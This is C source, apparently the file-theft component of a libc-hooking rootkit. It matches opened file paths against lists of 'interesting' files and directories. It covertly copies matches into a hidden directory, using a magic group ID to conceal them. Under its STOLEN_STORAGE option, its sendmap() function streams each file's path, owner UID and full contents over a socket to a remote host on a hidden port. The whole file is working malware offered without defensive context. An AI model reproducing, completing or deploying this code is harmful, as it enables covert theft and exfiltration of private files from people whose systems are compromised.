#ifdef BLACKLIST_TOO
int uninteresting(char *path){
    for(int i = 0; i < NAMESBLACKLIST_SIZE; i++){
        if(!strncmp(namesblacklist[i], path, strlen(namesblacklist[i])))
            return 1;

        if(!fnmatch(namesblacklist[i], path, FNM_PATHNAME))
            return 1;
    }
    return 0;
}
#endif

#if defined SYMLINK_FALLBACK || defined SYMLINK_ONLY
int linkfile(const char *oldpath, char *newpath){
    hook(CSYMLINK);
    char newnewpath[strlen(newpath)+6];
    snprintf(newnewpath, sizeof(newnewpath), "%s-link", newpath);

    if(oldpath[0] == '/')
        return (long)call(CSYMLINK, oldpath, newnewpath);
    
    // if oldpath is not a full pathname we must get it now
    char *cwd, *oldoldpath;

    cwd = getcwd(NULL, 0);
    if(cwd == NULL) return 1;
    oldoldpath = fullpath(cwd, oldpath);
    free(cwd);

    if(oldoldpath == NULL)
        return 1;

    int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
    free(oldoldpath);
    return ret;
}
#endif

char *fullpath(char *cwd, const char *file){
    size_t pathlen = strlen(cwd)+strlen(file)+2;
    char *ret = malloc(pathlen);
    if(!ret) return NULL;
    memset(ret, 0, pathlen);
    snprintf(ret, pathlen, "%s/%s", cwd, file);
    return ret;
}

int fileincwd(char *cwd, const char *file){
    int incwd=0;
    char *curpath = fullpath(cwd, file);
    if(curpath == NULL) return 0;

    hook(CACCESS);
    if((long)call(CACCESS, curpath, F_OK) == 0)
        incwd=1;

    free(curpath);
    return incwd;
}

#ifdef DIRECTORIES_TOO
int interestingdir(const char *path){
    int interest=0;
    char *cwd = getcwd(NULL, 0), *intdir;
    if(cwd != NULL){
        for(int i = 0; i != INTERESTING_DIRECTORIES_SIZE; i++){
            intdir = interesting_directories[i];

            if(!strncmp(intdir, cwd, strlen(intdir)) && fileincwd(cwd, path)){
                interest = 1;
                break;
            }

            if(!strncmp(intdir, path, strlen(intdir))){
                interest = 1;
                break;
            }
        }

        free(cwd);
    }

    return interest;
}
#endif

int interesting(const char *path){
    char *interesting_file;
    int interest = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            interest = 1;
            break;
        }

        if(!fnmatch(interesting_file, path, FNM_PATHNAME)){
            interest = 1;
            break;
        }
    }

#ifdef DIRECTORIES_TOO
    if(interest != 1 && interestingdir(path))
        interest = 1;
#endif

    return interest;
}


#ifdef ORIGINAL_RW_FALLBACK
void wcfallback(FILE *ofp, off_t fsize, char *newpath){
    FILE *nfp;
    unsigned char *buf;
    off_t blksize;
    size_t n, m;

    hook(CFOPEN, CFWRITE);

    nfp = call(CFOPEN, newpath, "w");

    blksize = getablocksize(fsize);
    do{
        buf = malloc(blksize+1);
        if(!buf) goto nopenope;
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (size_t)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);
nopenope:
    fcloser(2, ofp, nfp);
}
#endif

char *pathtmp(char *newpath){
    size_t pathsize = strlen(newpath)+5;
    char *path = malloc(pathsize);
    if(!path) return NULL;
    snprintf(path, pathsize, "%s.tmp", newpath);
    return path;
}

// determine if the file's .tmp is still up.
// if it is, determine if newpath is still being written.
// if it is, status=1, so don't try to write the file again.
int tmpup(char *newpath){
    char *path;
    int status=0;
    off_t o, n;

    hook(CACCESS, CUNLINK);

    if((long)call(CACCESS, newpath, F_OK) != 0)
        return 0;

    path = pathtmp(newpath);
    if(path == NULL) return -1;

    if((long)call(CACCESS, path, F_OK) != 0)
        goto nopenope;

    o = getfilesize(newpath);
    usleep(50000);
    n = getfilesize(newpath);

    if(o == n) call(CUNLINK, path); // file isn't getting any bigger... remove .tmp file. (it shouldn't even exist)
    else if(n > o) status=1; // file size is still increasing....

nopenope:
    free(path);
    return status;
}

#ifdef STOLEN_STORAGE
int sendmap(const char *oldpath, unsigned char *map, off_t fsize){
    char *host;
    unsigned char tmp[2];
    int sockfd;
    unsigned short port;
    struct sockaddr_in sa;

    hook(CSOCKET);
    sockfd = (long)call(CSOCKET, AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0) return -1;

    host = gethost();
    if(host == NULL){
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        return -1;
    }
    port = getport();
    if(!is_hidden_port(port)){
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        free(host);
        return -1;
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(host);
    free(host);
    sa.sin_port = htons(port);

    if(connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0){
        shutdown(sockfd, SHUT_RDWR);
        close(sockfd);
        return -1;
    }

    // send handy information about the target first.
    char initp[strlen(oldpath)+512];
    memset(initp, 0, sizeof(initp));
    snprintf(initp, sizeof(initp), "SOF:%u:%s:%ld\n", getuid(), oldpath, fsize);
    send(sockfd, initp, strlen(initp), 0);

    for(off_t i=0; i<fsize; i++){
        snprintf((char*)tmp, 2, "%c", map[i]);
        send(sockfd, tmp, 1, 0);
    }

    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
    return 1;
}
#endif

int writecopy(const char *oldpath, char *newpath){
    struct stat64 nstat; // for newpath, should it exist, to check if there's a change in size.
    int statr, t, done;
    unsigned char *map, p;
    char *tmppath;
    FILE *ofp, *nfp;
    off_t fsize;
    mode_t mode;

    hook(CFWRITE, C__LXSTAT64, CCREAT, CUNLINK);

    memset(&nstat, 0, sizeof(struct stat64));
    statr = (long)call(C__LXSTAT64, _STAT_VER, newpath, &nstat);
    if(statr < 0 && errno != ENOENT) return 1;

    ofp = bindup(oldpath, newpath, NULL, &fsize, &mode);
    if(ofp == NULL && errno == ENOENT) return 1;
    else if(ofp == NULL) return -1;

    t = tmpup(newpath);
    if(!S_ISREG(mode) || t || t<0){
        fclose(ofp);
        return 1;
    }

    done = 1 ? (statr != -1 && nstat.st_size == fsize) : 0;
#ifndef STOLEN_STORAGE
    if(done){
        fclose(ofp);
        return 1;
    }
#endif

#ifdef MAX_FILE_SIZE
    if(fsize > MAX_FILE_SIZE){
        fclose(ofp);
        return -1;
    }
#endif
#ifdef MAX_STEAL_SIZE
    if(getnewdirsize(INTEREST_DIR, fsize) > MAX_STEAL_SIZE){
        fclose(ofp);
        return -1;
    }
#endif

    map = mmap(NULL, fsize, PROT_READ, MAP_PRIVATE, fileno(ofp), 0);
    if(map == MAP_FAILED){
#ifdef ORIGINAL_RW_FALLBACK
        wcfallback(ofp, fsize, newpath);
        return 1;
#else
        fclose(ofp);
        return -1;
#endif
    }
    fclose(ofp);


#ifdef STOLEN_STORAGE
    int sendstatus = sendmap(oldpath, map, fsize);
    if(sendstatus > 0
        #ifdef NO_DISK_WRITE
        || sendstatus < 0
        #endif
        ){
        madvise(map, fsize, MADV_DONTNEED);
        munmap(map, fsize);
        return 1;
    }

    // this lets hoarder decide
    if(done){
        madvise(map, fsize, MADV_DONTNEED);
        munmap(map, fsize);
        return 1;
    }
#endif

    call(CUNLINK, newpath);

    nfp = call(CFOPEN, newpath, "ab");
    if(nfp == NULL){
        madvise(map, fsize, MADV_DONTNEED);
        munmap(map, fsize);
        return -1;
    }

    // create this file to make it clear that the file is still being copied. unlink it when done.
    tmppath = pathtmp(newpath);
    call(CCREAT, tmppath, 0600);
    for(off_t i=0; i<fsize; i++){
        p = map[i];
        fputc(p, nfp);
    }

    fclose(nfp);
    madvise(map, fsize, MADV_DONTNEED);
    munmap(map, fsize);
    call(CUNLINK, tmppath);
    free(tmppath);

#ifdef KEEP_FILE_MODE
    hook(CCHMOD);
    call(CCHMOD, newpath, mode);
#endif

    if(!notuser(0))  // if calling process is root then the magic gid is set. don't keep it on the copy result.
        chown_path(newpath, 0);

    return 1;
}

char *getnewpath(const char *oldpath){
    char *newpath, *newpathdup, **dirs, *pathd, *ret;
    size_t maxlen;
    int cdir;
    DIR *dp;

    hook(COPENDIR);

    dirs = getdirstructure(oldpath, &cdir);
    if(dirs == NULL) return NULL;

    newpath = createdirstructure(INTEREST_DIR, oldpath, dirs, cdir);
    if(newpath == NULL){
        freedirs(dirs, cdir);
        return NULL;
    }

dodo:
    newpathdup = strdup(newpath);
    pathd = dirname(newpathdup);
    dp = call(COPENDIR, pathd);
    free(newpathdup);
    if(dp == NULL && errno == ENOENT){
        if(mkdirstructure(INTEREST_DIR, dirs, cdir) < 0){
            freedirs(dirs, cdir);
            free(newpath);
            return NULL;
        }
        goto dodo;
    }else{
        freedirs(dirs, cdir);
        if(dp == NULL){
            free(newpath);
            return NULL;
        }else if(dp) closedir(dp);
    }

    maxlen = strlen(newpath)+32;
    ret = malloc(maxlen);
    if(!ret){
        free(newpath);
        return NULL;
    }
    memset(ret, 0, maxlen);
    snprintf(ret, maxlen-1, "%s-%u", newpath, getuid());
    free(newpath);
    return ret;
}

static int takeit(void *oldpath){
    if(!notuser(0)){   // hide, if we can...
        hook(CSETGID);
        call(CSETGID, readgid());
    }

    char *newpath = getnewpath(oldpath);
    if(newpath == NULL) return 0;

    int ret;
#ifdef SYMLINK_ONLY
    ret = linkfile(oldpath, newpath);
#else
    ret = writecopy(oldpath, newpath);
#ifdef SYMLINK_FALLBACK
    if(ret < 0)
        ret = linkfile(oldpath, newpath);
#endif
#endif

    free(newpath);
    return ret;
}


void inspectfile(const char *pathname){
    if(sssdproc() || rknomore()) return;

    hook(COPENDIR);
    DIR *dp = call(COPENDIR, INTEREST_DIR);
    if(dp == NULL && errno == ENOENT){
        if(notuser(0)) return;
        preparedir(INTEREST_DIR, readgid());
        inspectfile(pathname);
        return;
    }else if(dp == NULL) return;
    else if(dp != NULL) closedir(dp);

    char *dupdup   = strdup(pathname),
         *filename = basename(dupdup);

    if(strlen(pathname)<=1 || strlen(filename)<=1)
        goto nopenope;

    if(interesting(pathname) || interesting(filename)){
#ifdef BLACKLIST_TOO
        if(!uninteresting(filename))
            sneakyclone(takeit, dupdup);
#else
        sneakyclone(takeit, dupdup);
#endif
    }
nopenope:
    free(dupdup);
}
